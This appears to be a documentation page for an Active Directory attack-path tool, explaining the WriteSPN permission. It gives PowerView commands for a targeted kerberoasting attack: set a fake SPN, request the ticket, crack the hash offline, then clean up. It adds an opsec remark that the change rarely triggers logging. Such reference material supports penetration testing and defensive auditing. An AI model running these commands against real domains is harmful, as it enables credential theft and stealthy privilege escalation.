The ability to write directly to the servicePrincipalNames attribute on a user object. Writing to this property gives you the opportunity to perform a targeted kerberoasting attack against that user.

Abuse Info[](#heading-1)
------------------------

A targeted kerberoast attack can be performed using PowerViewâ€™s Set-DomainObject along with Get-DomainSPNTicket.

You may need to authenticate to the Domain Controller as the user with full control over the target user if you are not running a process as that user. To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):

```
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\\dfm.a', $SecPassword)
```

Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as the user with full control over the target user.
```
Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
```
After running this, you can use Get-DomainSPNTicket as follows:
```
Get-DomainSPNTicket -Credential $Cred harmj0y | fl
```
The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:
```
Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname
```
Opsec Considerations[](#heading-2)
----------------------------------

Modifying the servicePrincipalName attribute will not, by default, generate an event on the Domain Controller. Your target may have configured logging on users to generate 5136 events whenever a directory service is modified, but this configuration is very rare.
